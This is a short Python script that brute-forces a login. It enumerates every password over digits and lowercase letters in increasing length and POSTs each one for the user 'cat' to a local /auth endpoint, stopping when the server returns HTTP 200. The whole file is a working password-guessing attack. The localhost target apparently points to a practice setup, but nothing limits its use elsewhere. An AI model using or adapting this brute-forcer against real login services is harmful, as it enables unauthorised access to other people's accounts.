import requests

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

length = 0
i = 0

while True:
	# i: 10 -> base

	password = ''
	temp = i

	while temp != 0:
		rest = temp % base
		temp //= base
		password = alphabet[rest] + password

	#while len(password) < length:
	#	password = '0' + password

	password = alphabet[0] * (length - len(password)) + password

	print(length, i, password)
	response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})

	if response.status_code == 200:
		print('I GET IT')
		break

	if password == (alphabet[-1] * length):
		length += 1
		i = 0
	else:
		i += 1

